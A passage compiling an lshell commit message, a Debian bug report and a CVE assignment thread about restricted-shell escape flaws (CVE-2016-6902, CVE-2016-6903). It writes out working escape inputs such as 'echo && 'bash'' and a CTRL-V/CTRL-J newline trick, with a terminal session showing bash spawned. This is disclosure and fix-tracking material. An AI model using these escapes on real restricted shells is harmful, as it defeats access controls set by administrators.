‚Ä¶loses [#147](https://github.com/ghantoos/lshell/issues/147), Closes [#149](https://github.com/ghantoos/lshell/issues/149))

Both issues [#148](https://github.com/ghantoos/lshell/issues/148) and [#147](https://github.com/ghantoos/lshell/issues/147) use the same vulnerability in the parser,
that ignored the quoted strings. Parsing only the rest of the line
for security issues. This is a major security bug.

This commits also corrects a previous ommited correction regarding the
control charaters, that permitted to escape from lshell.

Thank you Proskurin Kirill ([@Oloremo](https://github.com/Oloremo)) and Vladislav Yarmak ([@Snawoot](https://github.com/Snawoot))
for reporting this!!

[security] MAJOR issue: catch ctrl escapes (Closes [#149](https://github.com/ghantoos/lshell/issues/149))

```
The was a major security issue with lshell that allows any user to
escape from lshell into bash (or any other available shell. This
was done by typing <CTRL-V><CTRL-J>bash after any allowed command.
For example:
~$ echo<CTRL-V><CTRL-J>bash

Thanks Vladislav Yarmak ([@Snawoot](https://github.com/Snawoot)) for reporting this major issue!

Package: lshell

lshell fails to parse shell syntax correctly and restrictions can be overrun:

Problem exists in current upstream code. There are opened issue on Github but no reaction yet: <https://github.com/ghantoos/lshell/issues/147>.

Command parser in this shell is beyound of recovery. I recommend to replace this shell with symlink to /usr/sbin/nologin.

If you run something like

`echo && 'bash'` or `echo || 'bash'` - it will exec bash command.

This can be avoided by adding && and || to forbidden list, but still.

Subject: lshell: Shell outbreak due to bad syntax parse
Date: Sat, 20 Aug 2016 23:15:12 +0300
```
Package: lshell
Version: 0.9.16-1
Severity: grave
Tags: security upstream
Justification: user security hole

lshell fails to parse shell syntax correctly and restrictions can be overrun:

root@debian:~# getent passwd testuser
testuser:x:1001:1001:,,,:/home/testuser:/usr/bin/lshell
root@debian:~# su - testuser
You are in a limited shell.
Type '?' or 'help' to get the list of allowed commands
testuser:~$ ?
cd  clear  echo  exit  help  history  ll  lpath  ls  lsudo
testuser:~$ bash
*** forbidden command: bash
testuser:~$ echo && 'bash'

testuser@debian:~$ ps -f
UID        PID  PPID  C STIME TTY          TIME CMD
testuser  4000  3999  0 23:12 pts/1    00:00:00 /usr/bin/python /usr/bin/lshell
testuser  4001  4000  0 23:12 pts/1    00:00:00 sh -c set -m; echo && 'bash'
testuser  4002  4001  0 23:12 pts/1    00:00:00 bash
testuser  4007  4002  0 23:13 pts/1    00:00:00 ps -f

Problem exists in current upstream code. There are opened issue on Github but no reaction yet: <https://github.com/ghantoos/lshell/issues/147>.

Command parser in this shell is beyound of recovery. I recommend to replace this shell with symlink to /usr/sbin/nologin.

Subject: Re: CVE Request: lshell: shell outbreak vulnerabilities via bad syntax parse and multiline commands

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> 1/ Shell outbreak due to bad syntax parse
>    - <https://github.com/ghantoos/lshell/issues/147>
>    - <https://bugs.debian.org/834949>

Use CVE-2016-6902.

> 2/ Shell outbreak with multiline commands
>    - <https://github.com/ghantoos/lshell/issues/149>
>    - Fix: <https://github.com/ghantoos/lshell/commit/e72dfcd1f258193f9aaea3591ecbdaed207661a0>
>    - <https://bugs.debian.org/834946>

Use CVE-2016-6903.

<https://bugs.debian.org/834949> and <https://bugs.debian.org/834946> also
mention "Command parser in this shell is beyound of recovery." This
suggests that other vulnerabilities may be fixed at the same time as
issues/147, or that other vulnerabilities may be discovered. In
particular,
<https://github.com/ghantoos/lshell/issues/147#issuecomment-241366750>
mentions a different attack methodology. At least for now,
<https://github.com/ghantoos/lshell/issues/147#issuecomment-241366750>
is within the scope of CVE-2016-6902. It is difficult to predict what
other CVE IDs may be needed until there is further vendor followup
about issues/147.
